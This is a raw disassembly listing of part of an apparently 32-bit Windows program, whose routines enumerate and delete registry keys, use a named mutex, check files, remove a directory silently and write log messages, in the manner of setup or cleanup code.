  40d2b5:	call   DWORD PTR ds:0x4141bc
  40d2bb:	mov    esi,DWORD PTR [ebp-0xe5c]
  40d2c1:	push   DWORD PTR [ebp-0xe64]
  40d2c7:	xor    eax,eax
  40d2c9:	lea    ecx,[ebp-0x218]
  40d2cf:	mov    edx,0x105
  40d2d4:	mov    WORD PTR [ebp-0x218],ax
  40d2db:	call   0x406b17
  40d2e0:	test   eax,eax
  40d2e2:	je     0x40d38f
  40d2e8:	push   esi
  40d2e9:	lea    ecx,[ebp-0xe58]
  40d2ef:	call   0x40eb66
  40d2f4:	lea    eax,[ebp-0xa42]
  40d2fa:	push   eax
  40d2fb:	push   eax
  40d2fc:	lea    eax,[ebp-0x218]
  40d302:	push   eax
  40d303:	push   0x403904
  40d308:	push   0x900
  40d30d:	push   edi
  40d30e:	push   edi
  40d30f:	lea    eax,[ebp-0x638]
  40d315:	push   0x105
  40d31a:	push   eax
  40d31b:	call   0x410f98
  40d320:	add    esp,0x24
  40d323:	test   eax,eax
  40d325:	js     0x40d38d
  40d327:	push   0x1
  40d329:	lea    eax,[ebp-0xe60]
  40d32f:	xor    ecx,ecx
  40d331:	push   eax
  40d332:	lea    edx,[ebp-0x218]
  40d338:	call   0x4068c4
  40d33d:	test   eax,eax
  40d33f:	je     0x40d38d
  40d341:	mov    esi,DWORD PTR [ebp-0xe60]
  40d347:	mov    eax,esi
  40d349:	test   esi,esi
  40d34b:	jne    0x40d352
  40d34d:	mov    eax,0x401a80
  40d352:	push   eax
  40d353:	push   ebx
  40d354:	push   0x403868
  40d359:	push   DWORD PTR ds:0x4130e8
  40d35f:	call   0x40e818
  40d364:	add    esp,0x10
  40d367:	mov    edx,ebx
  40d369:	xor    ecx,ecx
  40d36b:	push   0x1
  40d36d:	push   esi
  40d36e:	call   0x407202
  40d373:	lea    eax,[ebp-0x638]
  40d379:	mov    edx,ebx
  40d37b:	push   eax
  40d37c:	push   esi
  40d37d:	xor    ecx,ecx
  40d37f:	call   0x4079b1
  40d384:	push   esi
  40d385:	mov    edi,eax
  40d387:	call   DWORD PTR ds:0x4141bc
  40d38d:	mov    eax,edi
  40d38f:	mov    ecx,DWORD PTR [ebp-0x4]
  40d392:	pop    edi
  40d393:	pop    esi
  40d394:	xor    ecx,ebp
  40d396:	pop    ebx
  40d397:	call   0x411980
  40d39c:	mov    esp,ebp
  40d39e:	pop    ebp
  40d39f:	ret    0x4
  40d3a2:	int3   
  40d3a3:	int3   
  40d3a4:	int3   
  40d3a5:	int3   
  40d3a6:	int3   
  40d3a7:	mov    edi,edi
  40d3a9:	push   ebp
  40d3aa:	mov    ebp,esp
  40d3ac:	sub    esp,0x43c
  40d3b2:	mov    eax,ds:0x413004
  40d3b7:	xor    eax,ebp
  40d3b9:	mov    DWORD PTR [ebp-0x4],eax
  40d3bc:	push   ebx
  40d3bd:	push   esi
  40d3be:	push   edi
  40d3bf:	lea    eax,[ebp-0x42c]
  40d3c5:	mov    DWORD PTR [ebp-0x43c],edx
  40d3cb:	push   eax
  40d3cc:	push   0xf003f
  40d3d1:	push   0x0
  40d3d3:	push   0x401588
  40d3d8:	xor    esi,esi
  40d3da:	mov    ebx,ecx
  40d3dc:	push   0x80000002
  40d3e1:	inc    esi
  40d3e2:	call   DWORD PTR ds:0x414004
  40d3e8:	test   eax,eax
  40d3ea:	jne    0x40d4e6
  40d3f0:	mov    eax,0x104
  40d3f5:	xor    edi,edi
  40d3f7:	mov    DWORD PTR [ebp-0x434],eax
  40d3fd:	mov    DWORD PTR [ebp-0x430],eax
  40d403:	lea    eax,[ebp-0x430]
  40d409:	push   eax
  40d40a:	lea    eax,[ebp-0x218]
  40d410:	push   eax
  40d411:	lea    eax,[ebp-0x438]
  40d417:	push   eax
  40d418:	push   edi
  40d419:	lea    eax,[ebp-0x434]
  40d41f:	push   eax
  40d420:	lea    eax,[ebp-0x428]
  40d426:	push   eax
  40d427:	push   edi
  40d428:	jmp    0x40d4c4
  40d42d:	cmp    DWORD PTR [ebp-0x438],0x1
  40d434:	jne    0x40d48c
  40d436:	lea    edx,[ebp-0x218]
  40d43c:	lea    ecx,[ebp-0x428]
  40d442:	call   0x40c9db
  40d447:	test   eax,eax
  40d449:	je     0x40d48c
  40d44b:	lea    eax,[ebp-0x428]
  40d451:	mov    ecx,ebx
  40d453:	push   eax
  40d454:	lea    edx,[ebp-0x218]
  40d45a:	call   0x40d17b
  40d45f:	and    esi,eax
  40d461:	lea    edx,[ebp-0x218]
  40d467:	lea    eax,[ebp-0x428]
  40d46d:	mov    ecx,ebx
  40d46f:	push   eax
  40d470:	call   0x40cbd3
  40d475:	push   DWORD PTR [ebp-0x43c]
  40d47b:	lea    edx,[ebp-0x218]
  40d481:	mov    ecx,ebx
  40d483:	and    esi,eax
  40d485:	call   0x40ced7
  40d48a:	and    esi,eax
  40d48c:	mov    eax,0x104
  40d491:	inc    edi
  40d492:	mov    DWORD PTR [ebp-0x434],eax
  40d498:	mov    DWORD PTR [ebp-0x430],eax
  40d49e:	lea    eax,[ebp-0x430]
  40d4a4:	push   eax
  40d4a5:	lea    eax,[ebp-0x218]
  40d4ab:	push   eax
  40d4ac:	lea    eax,[ebp-0x438]
  40d4b2:	push   eax
  40d4b3:	push   0x0
  40d4b5:	lea    eax,[ebp-0x434]
  40d4bb:	push   eax
  40d4bc:	lea    eax,[ebp-0x428]
  40d4c2:	push   eax
  40d4c3:	push   edi
  40d4c4:	push   DWORD PTR [ebp-0x42c]
  40d4ca:	call   DWORD PTR ds:0x414040
  40d4d0:	test   eax,eax
  40d4d2:	je     0x40d42d
  40d4d8:	push   DWORD PTR [ebp-0x42c]
  40d4de:	call   DWORD PTR ds:0x414008
  40d4e4:	jmp    0x40d4f8
  40d4e6:	push   0x40391c
  40d4eb:	push   DWORD PTR ds:0x4130e8
  40d4f1:	call   0x40e818
  40d4f6:	pop    ecx
  40d4f7:	pop    ecx
  40d4f8:	call   0x408277
  40d4fd:	mov    ecx,DWORD PTR [ebp-0x4]
  40d500:	neg    esi
  40d502:	pop    edi
  40d503:	sbb    esi,esi
  40d505:	xor    ecx,ebp
  40d507:	and    esi,0x7fffbffb
  40d50d:	lea    eax,[esi-0x7fffbffb]
  40d513:	pop    esi
  40d514:	pop    ebx
  40d515:	call   0x411980
  40d51a:	mov    esp,ebp
  40d51c:	pop    ebp
  40d51d:	ret    
  40d51e:	int3   
  40d51f:	int3   
  40d520:	int3   
  40d521:	int3   
  40d522:	int3   
  40d523:	mov    edi,edi
  40d525:	push   ebp
  40d526:	mov    ebp,esp
  40d528:	sub    esp,0x64c
  40d52e:	mov    eax,ds:0x413004
  40d533:	xor    eax,ebp
  40d535:	mov    DWORD PTR [ebp-0x4],eax
  40d538:	push   ebx
  40d539:	push   esi
  40d53a:	push   edi
  40d53b:	xor    eax,eax
  40d53d:	xor    ebx,ebx
  40d53f:	push   0x208
  40d544:	mov    WORD PTR [ebp-0x638],ax
  40d54b:	mov    esi,ecx
  40d54d:	lea    eax,[ebp-0x636]
  40d553:	push   ebx
  40d554:	push   eax
  40d555:	call   0x412060
  40d55a:	add    esp,0xc
  40d55d:	lea    eax,[ebp-0x638]
  40d563:	push   eax
  40d564:	push   0x104
  40d569:	call   DWORD PTR ds:0x41408c
  40d56f:	test   eax,eax
  40d571:	jne    0x40d57d
  40d573:	mov    eax,0x80004005
  40d578:	jmp    0x40d768
  40d57d:	sub    esp,0xc
  40d580:	lea    ecx,[ebp-0x638]
  40d586:	mov    edx,0x105
  40d58b:	push   0x401338
  40d590:	call   0x410f31
  40d595:	lea    eax,[ebp-0x63c]
  40d59b:	push   eax
  40d59c:	push   0xf003f
  40d5a1:	push   ebx
  40d5a2:	push   0x401588
  40d5a7:	push   0x80000002
  40d5ac:	call   DWORD PTR ds:0x414004
  40d5b2:	test   eax,eax
  40d5b4:	jne    0x40d708
  40d5ba:	mov    eax,0x104
  40d5bf:	mov    edi,ebx
  40d5c1:	mov    DWORD PTR [ebp-0x640],eax
  40d5c7:	mov    DWORD PTR [ebp-0x644],eax
  40d5cd:	lea    eax,[ebp-0x644]
  40d5d3:	push   eax
  40d5d4:	lea    eax,[ebp-0x218]
  40d5da:	push   eax
  40d5db:	lea    eax,[ebp-0x648]
  40d5e1:	push   eax
  40d5e2:	push   ebx
  40d5e3:	lea    eax,[ebp-0x640]
  40d5e9:	push   eax
  40d5ea:	lea    eax,[ebp-0x428]
  40d5f0:	push   eax
  40d5f1:	push   ebx
  40d5f2:	jmp    0x40d6e6
  40d5f7:	cmp    DWORD PTR [ebp-0x648],0x1
  40d5fe:	jne    0x40d6af
  40d604:	lea    eax,[ebp-0x428]
  40d60a:	mov    ecx,esi
  40d60c:	push   eax
  40d60d:	lea    edx,[ebp-0x218]
  40d613:	call   0x40d17b
  40d618:	test   eax,eax
  40d61a:	jne    0x40d63d
  40d61c:	lea    eax,[ebp-0x218]
  40d622:	push   eax
  40d623:	lea    eax,[ebp-0x428]
  40d629:	push   eax
  40d62a:	push   0x403960
  40d62f:	push   DWORD PTR ds:0x4130e8
  40d635:	call   0x40e818
  40d63a:	add    esp,0x10
  40d63d:	lea    eax,[ebp-0x428]
  40d643:	mov    ecx,esi
  40d645:	push   eax
  40d646:	lea    edx,[ebp-0x218]
  40d64c:	call   0x40cbd3
  40d651:	test   eax,eax
  40d653:	jne    0x40d676
  40d655:	lea    eax,[ebp-0x218]
  40d65b:	push   eax
  40d65c:	lea    eax,[ebp-0x428]
  40d662:	push   eax
  40d663:	push   0x403a28
  40d668:	push   DWORD PTR ds:0x4130e8
  40d66e:	call   0x40e818
  40d673:	add    esp,0x10
  40d676:	lea    eax,[ebp-0x638]
  40d67c:	mov    ecx,esi
  40d67e:	push   eax
  40d67f:	lea    edx,[ebp-0x218]
  40d685:	call   0x40ced7
  40d68a:	test   eax,eax
  40d68c:	jne    0x40d6af
  40d68e:	lea    eax,[ebp-0x218]
  40d694:	push   eax
  40d695:	lea    eax,[ebp-0x428]
  40d69b:	push   eax
  40d69c:	push   0x403b00
  40d6a1:	push   DWORD PTR ds:0x4130e8
  40d6a7:	call   0x40e818
  40d6ac:	add    esp,0x10
  40d6af:	mov    eax,0x104
  40d6b4:	inc    edi
  40d6b5:	mov    DWORD PTR [ebp-0x640],eax
  40d6bb:	mov    DWORD PTR [ebp-0x644],eax
  40d6c1:	lea    eax,[ebp-0x644]
  40d6c7:	push   eax
  40d6c8:	lea    eax,[ebp-0x218]
  40d6ce:	push   eax
  40d6cf:	lea    eax,[ebp-0x648]
  40d6d5:	push   eax
  40d6d6:	push   ebx
  40d6d7:	lea    eax,[ebp-0x640]
  40d6dd:	push   eax
  40d6de:	lea    eax,[ebp-0x428]
  40d6e4:	push   eax
  40d6e5:	push   edi
  40d6e6:	push   DWORD PTR [ebp-0x63c]
  40d6ec:	call   DWORD PTR ds:0x414040
  40d6f2:	test   eax,eax
  40d6f4:	je     0x40d5f7
  40d6fa:	push   DWORD PTR [ebp-0x63c]
  40d700:	call   DWORD PTR ds:0x414008
  40d706:	jmp    0x40d71a
  40d708:	push   0x40391c
  40d70d:	push   DWORD PTR ds:0x4130e8
  40d713:	call   0x40e818
  40d718:	pop    ecx
  40d719:	pop    ecx
  40d71a:	call   0x408277
  40d71f:	lea    eax,[ebp-0x63c]
  40d725:	push   eax
  40d726:	push   0x2
  40d728:	push   ebx
  40d729:	push   0x403bc0
  40d72e:	push   0x80000002
  40d733:	call   DWORD PTR ds:0x414004
  40d739:	test   eax,eax
  40d73b:	jle    0x40d747
  40d73d:	movzx  eax,ax
  40d740:	or     eax,0x80070000
  40d745:	test   eax,eax
  40d747:	js     0x40d766
  40d749:	push   0x403c20
  40d74e:	push   DWORD PTR [ebp-0x63c]
  40d754:	call   DWORD PTR ds:0x414028
  40d75a:	push   DWORD PTR [ebp-0x63c]
  40d760:	call   DWORD PTR ds:0x414008
  40d766:	xor    eax,eax
  40d768:	mov    ecx,DWORD PTR [ebp-0x4]
  40d76b:	pop    edi
  40d76c:	pop    esi
  40d76d:	xor    ecx,ebp
  40d76f:	pop    ebx
  40d770:	call   0x411980
  40d775:	mov    esp,ebp
  40d777:	pop    ebp
  40d778:	ret    
  40d779:	int3   
  40d77a:	int3   
  40d77b:	int3   
  40d77c:	int3   
  40d77d:	int3   
  40d77e:	mov    edi,edi
  40d780:	push   ebp
  40d781:	mov    ebp,esp
  40d783:	push   ebx
  40d784:	push   esi
  40d785:	push   edi
  40d786:	mov    esi,ecx
  40d788:	mov    edi,0x401440
  40d78d:	push   edi
  40d78e:	push   0x403c68
  40d793:	and    DWORD PTR [esi+0x4],0x0
  40d797:	push   DWORD PTR ds:0x4130e8
  40d79d:	call   0x40e818
  40d7a2:	add    esp,0xc
  40d7a5:	xor    ebx,ebx
  40d7a7:	inc    ebx
  40d7a8:	push   edi
  40d7a9:	push   ebx
  40d7aa:	push   0x0
  40d7ac:	call   DWORD PTR ds:0x4140b8
  40d7b2:	mov    DWORD PTR [esi],eax
  40d7b4:	test   eax,eax
  40d7b6:	jne    0x40d7bf
  40d7b8:	xor    eax,eax
  40d7ba:	jmp    0x40d88f
  40d7bf:	call   DWORD PTR ds:0x414074
  40d7c5:	cmp    eax,0xb7
  40d7ca:	je     0x40d7d4
  40d7cc:	mov    DWORD PTR [esi+0x4],ebx
  40d7cf:	jmp    0x40d88d
  40d7d4:	push   edi
  40d7d5:	push   0x403cd8
  40d7da:	push   DWORD PTR ds:0x4130e8
  40d7e0:	call   0x40e818
  40d7e5:	add    esp,0xc
  40d7e8:	cmp    DWORD PTR [ebp+0xc],0x0
  40d7ec:	jne    0x40d80f
  40d7ee:	push   edi
  40d7ef:	push   0x403d38
  40d7f4:	push   DWORD PTR ds:0x4130e8
  40d7fa:	call   0x40e818
  40d7ff:	add    esp,0xc
  40d802:	push   DWORD PTR [esi]
  40d804:	call   DWORD PTR ds:0x414084
  40d80a:	and    DWORD PTR [esi],0x0
  40d80d:	jmp    0x40d7b8
  40d80f:	push   0x403da0
  40d814:	push   DWORD PTR ds:0x4130e8
  40d81a:	call   0x40e818
  40d81f:	pop    ecx
  40d820:	pop    ecx
  40d821:	push   0xffffffff
  40d823:	push   DWORD PTR [esi]
  40d825:	call   DWORD PTR ds:0x4140bc
  40d82b:	test   eax,eax
  40d82d:	je     0x40d876
  40d82f:	cmp    eax,0x80
  40d834:	je     0x40d862
  40d836:	cmp    eax,0x102
  40d83b:	je     0x40d85a
  40d83d:	call   DWORD PTR ds:0x414074
  40d843:	push   eax
  40d844:	push   edi
  40d845:	push   0x403f38
  40d84a:	push   DWORD PTR ds:0x4130e8
  40d850:	call   0x40e818
  40d855:	add    esp,0x10
  40d858:	jmp    0x40d802
  40d85a:	push   edi
  40d85b:	push   0x403ed8
  40d860:	jmp    0x40d7f4
  40d862:	push   edi
  40d863:	push   0x403df8
  40d868:	push   DWORD PTR ds:0x4130e8
  40d86e:	call   0x40e818
  40d873:	add    esp,0xc
  40d876:	push   edi
  40d877:	mov    DWORD PTR [esi+0x4],ebx
  40d87a:	push   0x403e80
  40d87f:	push   DWORD PTR ds:0x4130e8
  40d885:	call   0x40e818
  40d88a:	add    esp,0xc
  40d88d:	mov    eax,ebx
  40d88f:	pop    edi
  40d890:	pop    esi
  40d891:	pop    ebx
  40d892:	pop    ebp
  40d893:	ret    0x10
  40d896:	int3   
  40d897:	int3   
  40d898:	int3   
  40d899:	int3   
  40d89a:	int3   
  40d89b:	mov    edi,edi
  40d89d:	push   esi
  40d89e:	mov    esi,ecx
  40d8a0:	cmp    DWORD PTR [esi],0x0
  40d8a3:	je     0x40d8c2
  40d8a5:	cmp    DWORD PTR [esi+0x4],0x0
  40d8a9:	je     0x40d8b7
  40d8ab:	push   DWORD PTR [esi]
  40d8ad:	call   DWORD PTR ds:0x4140c0
  40d8b3:	and    DWORD PTR [esi+0x4],0x0
  40d8b7:	push   DWORD PTR [esi]
  40d8b9:	call   DWORD PTR ds:0x414084
  40d8bf:	and    DWORD PTR [esi],0x0
  40d8c2:	pop    esi
  40d8c3:	ret    
  40d8c4:	int3   
  40d8c5:	int3   
  40d8c6:	int3   
  40d8c7:	int3   
  40d8c8:	int3   
  40d8c9:	mov    edi,edi
  40d8cb:	push   ebp
  40d8cc:	mov    ebp,esp
  40d8ce:	sub    esp,0x18
  40d8d1:	and    DWORD PTR [ebp-0x4],0x0
  40d8d5:	push   ebx
  40d8d6:	push   esi
  40d8d7:	push   edi
  40d8d8:	xor    edi,edi
  40d8da:	mov    DWORD PTR [ebp-0xc],ecx
  40d8dd:	and    DWORD PTR [ebp-0x8],edi
  40d8e0:	mov    ebx,edx
  40d8e2:	push   0x57
  40d8e4:	pop    esi
  40d8e5:	test   ebx,ebx
  40d8e7:	je     0x40d9ea
  40d8ed:	push   ebx
  40d8ee:	call   DWORD PTR ds:0x414068
  40d8f4:	push   0x2
  40d8f6:	pop    edx
  40d8f7:	test   eax,eax
  40d8f9:	je     0x40d971
  40d8fb:	push   0x5c
  40d8fd:	pop    ecx
  40d8fe:	cmp    cx,WORD PTR [ebx+eax*2-0x2]
  40d903:	jne    0x40d971
  40d905:	lea    esi,[eax+0x1]
  40d908:	cmp    esi,eax
  40d90a:	jb     0x40d952
  40d90c:	mov    eax,esi
  40d90e:	mul    edx
  40d910:	test   edx,edx
  40d912:	jne    0x40d952
  40d914:	cmp    eax,0xffffffff
  40d917:	ja     0x40d952
  40d919:	push   eax
  40d91a:	call   DWORD PTR ds:0x4141b0
  40d920:	mov    edi,eax
  40d922:	test   edi,edi
  40d924:	je     0x40d94e
  40d926:	push   0x900
  40d92b:	push   ecx
  40d92c:	push   ecx
  40d92d:	push   ebx
  40d92e:	mov    edx,esi
  40d930:	mov    DWORD PTR [ebp-0x8],0x1
  40d937:	mov    ecx,edi
  40d939:	call   0x4064d3
  40d93e:	mov    esi,eax
  40d940:	and    esi,0xffff
  40d946:	jne    0x40d9ce
  40d94c:	jmp    0x40d973
  40d94e:	push   0x8
  40d950:	jmp    0x40d9cd
  40d952:	push   0x80070216
  40d957:	push   0x404088
  40d95c:	push   DWORD PTR ds:0x4130e8
  40d962:	mov    esi,0x216
  40d967:	call   0x40e818
  40d96c:	add    esp,0xc
  40d96f:	jmp    0x40d9ce
  40d971:	mov    edi,ebx
  40d973:	mov    esi,DWORD PTR [ebp-0xc]
  40d976:	lea    eax,[ebp-0x4]
  40d979:	push   eax
  40d97a:	push   0xf003f
  40d97f:	xor    ebx,ebx
  40d981:	push   ebx
  40d982:	push   edi
  40d983:	push   esi
  40d984:	call   DWORD PTR ds:0x414004
  40d98a:	test   eax,eax
  40d98c:	jne    0x40d9cb
  40d98e:	push   ebx
  40d98f:	push   ebx
  40d990:	push   ebx
  40d991:	push   ebx
  40d992:	lea    eax,[ebp-0x14]
  40d995:	push   eax
  40d996:	push   ebx
  40d997:	push   ebx
  40d998:	lea    eax,[ebp-0x10]
  40d99b:	push   eax
  40d99c:	push   ebx
  40d99d:	push   ebx
  40d99e:	push   ebx
  40d99f:	push   DWORD PTR [ebp-0x4]
  40d9a2:	call   DWORD PTR ds:0x414010
  40d9a8:	test   eax,eax
  40d9aa:	jne    0x40d9cb
  40d9ac:	cmp    DWORD PTR [ebp-0x10],ebx
  40d9af:	jne    0x40d9c7
  40d9b1:	cmp    DWORD PTR [ebp+0x8],ebx
  40d9b4:	jne    0x40d9bb
  40d9b6:	cmp    DWORD PTR [ebp-0x14],ebx
  40d9b9:	jne    0x40d9c7
  40d9bb:	push   edi
  40d9bc:	push   esi
  40d9bd:	call   DWORD PTR ds:0x414014
  40d9c3:	mov    esi,eax
  40d9c5:	jmp    0x40d9ce
  40d9c7:	push   0x50
  40d9c9:	jmp    0x40d9cd
  40d9cb:	push   0x2
  40d9cd:	pop    esi
  40d9ce:	cmp    DWORD PTR [ebp-0x4],0x0
  40d9d2:	je     0x40d9dd
  40d9d4:	push   DWORD PTR [ebp-0x4]
  40d9d7:	call   DWORD PTR ds:0x414008
  40d9dd:	cmp    DWORD PTR [ebp-0x8],0x0
  40d9e1:	je     0x40d9ea
  40d9e3:	push   edi
  40d9e4:	call   DWORD PTR ds:0x4141bc
  40d9ea:	pop    edi
  40d9eb:	mov    eax,esi
  40d9ed:	pop    esi
  40d9ee:	pop    ebx
  40d9ef:	mov    esp,ebp
  40d9f1:	pop    ebp
  40d9f2:	ret    0x4
  40d9f5:	int3   
  40d9f6:	int3   
  40d9f7:	int3   
  40d9f8:	int3   
  40d9f9:	int3   
  40d9fa:	mov    edi,edi
  40d9fc:	push   ebp
  40d9fd:	mov    ebp,esp
  40d9ff:	sub    esp,0x230
  40da05:	mov    eax,ds:0x413004
  40da0a:	xor    eax,ebp
  40da0c:	mov    DWORD PTR [ebp-0x4],eax
  40da0f:	push   esi
  40da10:	push   edi
  40da11:	mov    edi,ecx
  40da13:	xor    esi,esi
  40da15:	test   edi,edi
  40da17:	je     0x40daee
  40da1d:	cmp    WORD PTR [edi],si
  40da20:	je     0x40daee
  40da26:	push   ebx
  40da27:	push   esi
  40da28:	push   0x2000080
  40da2d:	push   0x3
  40da2f:	pop    ebx
  40da30:	push   ebx
  40da31:	push   esi
  40da32:	push   ebx
  40da33:	push   esi
  40da34:	push   edi
  40da35:	call   DWORD PTR ds:0x41405c
  40da3b:	cmp    eax,0xffffffff
  40da3e:	je     0x40daed
  40da44:	push   eax
  40da45:	call   DWORD PTR ds:0x414084
  40da4b:	xor    eax,eax
  40da4d:	push   0x20a
  40da52:	mov    WORD PTR [ebp-0x210],ax
  40da59:	lea    eax,[ebp-0x20e]
  40da5f:	push   esi
  40da60:	push   eax
  40da61:	call   0x412060
  40da66:	add    esp,0xc
  40da69:	mov    edx,0x105
  40da6e:	push   0x100
  40da73:	push   ecx
  40da74:	push   ecx
  40da75:	push   edi
  40da76:	lea    ecx,[ebp-0x210]
  40da7c:	call   0x4064d3
  40da81:	test   eax,eax
  40da83:	jns    0x40da8a
  40da85:	movzx  esi,ax
  40da88:	jmp    0x40daed
  40da8a:	lea    eax,[ebp-0x210]
  40da90:	mov    DWORD PTR [ebp-0x230],esi
  40da96:	mov    DWORD PTR [ebp-0x228],eax
  40da9c:	mov    eax,0x414
  40daa1:	mov    WORD PTR [ebp-0x220],ax
  40daa8:	lea    eax,[ebp-0x230]
  40daae:	push   eax
  40daaf:	mov    DWORD PTR [ebp-0x22c],ebx
  40dab5:	mov    DWORD PTR [ebp-0x224],esi
  40dabb:	mov    DWORD PTR [ebp-0x21e],esi
  40dac1:	mov    DWORD PTR [ebp-0x21a],esi
  40dac7:	mov    DWORD PTR [ebp-0x216],esi
  40dacd:	call   DWORD PTR ds:0x414138
  40dad3:	mov    esi,eax
  40dad5:	test   esi,esi
  40dad7:	je     0x40daed
  40dad9:	push   esi
  40dada:	push   0x404110
  40dadf:	push   DWORD PTR ds:0x4130e8
  40dae5:	call   0x40e818
  40daea:	add    esp,0xc
  40daed:	pop    ebx
  40daee:	mov    ecx,DWORD PTR [ebp-0x4]
  40daf1:	mov    eax,esi
  40daf3:	pop    edi
  40daf4:	xor    ecx,ebp
  40daf6:	pop    esi
  40daf7:	call   0x411980
  40dafc:	mov    esp,ebp
  40dafe:	pop    ebp
  40daff:	ret    
  40db00:	int3   
  40db01:	int3   
  40db02:	int3   
  40db03:	int3   
  40db04:	int3   
  40db05:	mov    edi,edi
  40db07:	push   ebp
  40db08:	mov    ebp,esp
  40db0a:	sub    esp,0x834
  40db10:	mov    eax,ds:0x413004
  40db15:	xor    eax,ebp
  40db17:	mov    DWORD PTR [ebp-0x4],eax
  40db1a:	push   ebx
  40db1b:	push   esi
  40db1c:	push   edi
  40db1d:	xor    eax,eax
  40db1f:	xor    edi,edi
  40db21:	push   0x208
  40db26:	mov    WORD PTR [ebp-0x210],ax
  40db2d:	mov    esi,edx
  40db2f:	lea    eax,[ebp-0x20e]
  40db35:	mov    ebx,ecx
  40db37:	push   edi
  40db38:	push   eax
  40db39:	call   0x412060
  40db3e:	add    esp,0xc
  40db41:	lea    eax,[ebp-0x210]
  40db47:	push   0x104
  40db4c:	push   eax
  40db4d:	push   0xd2
  40db52:	push   ebx
  40db53:	call   DWORD PTR ds:0x414188
  40db59:	push   esi
  40db5a:	mov    esi,0x104
  40db5f:	lea    eax,[ebp-0x41c]
  40db65:	push   esi
  40db66:	push   eax
  40db67:	push   0x401068
  40db6c:	push   0x402870
  40db71:	push   0x4010d8
  40db76:	call   DWORD PTR ds:0x414114
  40db7c:	xor    eax,eax
  40db7e:	cmp    ax,WORD PTR [ebp-0x41c]
  40db85:	je     0x40dbe2
  40db87:	push   esi
  40db88:	lea    eax,[ebp-0x628]
  40db8e:	push   eax
  40db8f:	push   0xca
  40db94:	push   ebx
  40db95:	call   DWORD PTR ds:0x414188
  40db9b:	lea    eax,[ebp-0x41c]
  40dba1:	push   eax
  40dba2:	lea    eax,[ebp-0x628]
  40dba8:	push   eax
  40dba9:	push   0x900
  40dbae:	push   edi
  40dbaf:	push   edi
  40dbb0:	lea    eax,[ebp-0x834]
  40dbb6:	push   0x105
  40dbbb:	push   eax
  40dbbc:	call   0x410f98
  40dbc1:	add    esp,0x1c
  40dbc4:	lea    eax,[ebp-0x210]
  40dbca:	push   esi
  40dbcb:	push   eax
  40dbcc:	lea    eax,[ebp-0x834]
  40dbd2:	push   eax
  40dbd3:	push   edi
  40dbd4:	call   DWORD PTR ds:0x414168
  40dbda:	lea    edi,[eax-0x6]
  40dbdd:	neg    edi
  40dbdf:	sbb    edi,edi
  40dbe1:	inc    edi
  40dbe2:	mov    ecx,DWORD PTR [ebp-0x4]
  40dbe5:	mov    eax,edi
  40dbe7:	pop    edi
  40dbe8:	pop    esi
  40dbe9:	xor    ecx,ebp
  40dbeb:	pop    ebx
  40dbec:	call   0x411980
  40dbf1:	mov    esp,ebp
  40dbf3:	pop    ebp
  40dbf4:	ret    
  40dbf5:	int3   
  40dbf6:	int3   
  40dbf7:	int3   
  40dbf8:	int3   
  40dbf9:	int3   
  40dbfa:	mov    edi,edi
  40dbfc:	push   ebp
  40dbfd:	mov    ebp,esp
  40dbff:	sub    esp,0xa2c
  40dc05:	mov    eax,ds:0x413004
  40dc0a:	xor    eax,ebp
  40dc0c:	mov    DWORD PTR [ebp-0x4],eax
  40dc0f:	push   ebx
  40dc10:	push   esi
  40dc11:	push   edi
  40dc12:	xor    eax,eax
  40dc14:	mov    edi,edx
  40dc16:	push   0x208
  40dc1b:	push   eax
  40dc1c:	mov    WORD PTR [ebp-0x210],ax
  40dc23:	mov    esi,ecx
  40dc25:	lea    eax,[ebp-0x20e]
  40dc2b:	push   eax
  40dc2c:	call   0x412060
  40dc31:	add    esp,0xc
  40dc34:	lea    eax,[ebp-0x210]
  40dc3a:	mov    ebx,0x105
  40dc3f:	push   ebx
  40dc40:	push   eax
  40dc41:	push   esi
  40dc42:	call   DWORD PTR ds:0x4140b4
  40dc48:	lea    eax,[ebp-0x210]
  40dc4e:	push   eax
  40dc4f:	lea    ecx,[ebp-0xa2c]
  40dc55:	call   0x40eb66
  40dc5a:	lea    eax,[ebp-0x818]
  40dc60:	push   eax
  40dc61:	lea    eax,[ebp-0x822]
  40dc67:	push   eax
  40dc68:	push   0x401f98
  40dc6d:	push   0x900
  40dc72:	push   0x0
  40dc74:	push   0x0
  40dc76:	push   ebx
  40dc77:	push   edi
  40dc78:	call   0x410f98
  40dc7d:	add    esp,0x20
  40dc80:	push   edi
  40dc81:	call   DWORD PTR ds:0x414068
  40dc87:	push   0x5c
  40dc89:	pop    ecx
  40dc8a:	cmp    cx,WORD PTR [edi+eax*2-0x2]
  40dc8f:	jne    0x40dc9f
  40dc91:	push   edi
  40dc92:	call   DWORD PTR ds:0x414068
  40dc98:	xor    ecx,ecx
  40dc9a:	mov    WORD PTR [edi+eax*2-0x2],cx
  40dc9f:	mov    ecx,DWORD PTR [ebp-0x4]
  40dca2:	pop    edi
  40dca3:	pop    esi
  40dca4:	xor    ecx,ebp
  40dca6:	pop    ebx
  40dca7:	call   0x411980
  40dcac:	mov    esp,ebp
  40dcae:	pop    ebp
  40dcaf:	ret    0x4
  40dcb2:	int3   
  40dcb3:	int3   
  40dcb4:	int3   
  40dcb5:	int3   
  40dcb6:	int3   
  40dcb7:	mov    edi,edi
  40dcb9:	push   ebp
  40dcba:	mov    ebp,esp
  40dcbc:	mov    eax,0x1630
  40dcc1:	call   0x412030
  40dcc6:	mov    eax,ds:0x413004
  40dccb:	xor    eax,ebp
  40dccd:	mov    DWORD PTR [ebp-0x4],eax
  40dcd0:	and    DWORD PTR [ebp-0x15ec],0x0
  40dcd7:	push   ebx
  40dcd8:	push   esi
  40dcd9:	push   edi
  40dcda:	mov    edi,ecx
  40dcdc:	mov    esi,edx
  40dcde:	lea    ecx,[ebp-0x15e8]
  40dce4:	mov    DWORD PTR [ebp-0x15f8],esi
  40dcea:	mov    DWORD PTR [ebp-0x160c],edi
  40dcf0:	call   0x40fa55
  40dcf5:	xor    ebx,ebx
  40dcf7:	lea    eax,[ebp-0x1298]
  40dcfd:	and    DWORD PTR [ebp-0x15fc],ebx
  40dd03:	push   0x20a
  40dd08:	push   ebx
  40dd09:	push   eax
  40dd0a:	call   0x412060
  40dd0f:	add    esp,0xc
  40dd12:	lea    eax,[ebp-0x218]
  40dd18:	push   0x20a
  40dd1d:	push   ebx
  40dd1e:	push   eax
  40dd1f:	call   0x412060
  40dd24:	add    esp,0xc
  40dd27:	lea    eax,[ebp-0x848]
  40dd2d:	push   0x20a
  40dd32:	push   ebx
  40dd33:	push   eax
  40dd34:	call   0x412060
  40dd39:	add    esp,0xc
  40dd3c:	xor    eax,eax
  40dd3e:	mov    WORD PTR [ebp-0xc68],ax
  40dd45:	push   0x208
  40dd4a:	push   eax
